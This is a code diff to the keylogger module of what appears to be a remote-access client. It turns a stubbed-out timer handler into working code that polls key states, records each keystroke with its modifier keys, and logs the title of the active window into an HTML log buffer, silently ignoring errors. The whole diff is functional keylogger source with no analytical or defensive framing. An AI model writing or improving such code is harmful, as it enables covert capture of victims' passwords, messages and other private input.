@@ -159,23 +159,34 @@ namespace xClient.Core.Keylogger
 
         private void timerLogKeys_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
-            foreach (short i in _allKeys) //Loop through our enumValues list populated with the keys we want to log
+            // Loop through each value in the array of keys to record.
+            foreach (short i in _allKeys)
             {
-                if (Win32.GetAsyncKeyState(i) == -32767) //GetAsycKeyState returns -32767 to indicate keypress
+                // GetAsycKeyState returns the result by setting the most significant
+                // bit if the key is up, and sets the least significant bit if the
+                // key was pressed.
+                if (Win32.GetAsyncKeyState(i) == -32767)
                 {
-                    // TODO: RE-WRITE THE WAY THE KEYBUFFER ADDS A NEW LOGGED KEY.
+                    try
+                    {
+                        LoggedKey KeyToLog = new LoggedKey() { PressedKey = (KeyloggerKeys)i };
+                        KeyToLog.RecordModifierKeys();
 
-                    //_keyBuffer.Add(new LoggedKey() { PressedChar = i });
-                    //_hWndTitle = GetActiveWindowTitle(); //Get active thread window title
-                    //if (_hWndTitle != null)
-                    //{
-                    //    if (_hWndTitle != _hWndLastTitle && _enumValues.Contains(i))
-                    //        //Only write title to log if a key is pressed that we support
-                    //    {
-                    //        _hWndLastTitle = _hWndTitle;
-                    //        _logFileBuffer.Append("<br><br>[<b>" + _hWndTitle + "</b>]<br>");
-                    //    }
-                    //}
+                        _keyBuffer.Add(KeyToLog);
+                        _hWndTitle = GetActiveWindowTitle(); //Get active thread window title
+
+                        if (!string.IsNullOrEmpty(_hWndTitle))
+                        {
+                            // Only write the title to the log file if the names are different.
+                            if (_hWndTitle != _hWndLastTitle)
+                            {
+                                _hWndLastTitle = _hWndTitle;
+                                _logFileBuffer.Append("<br><br>[<b>" + _hWndTitle + "</b>]<br>");
+                            }
+                        }
+                    }
+                    catch
+                    { }
                 }
             }
         }
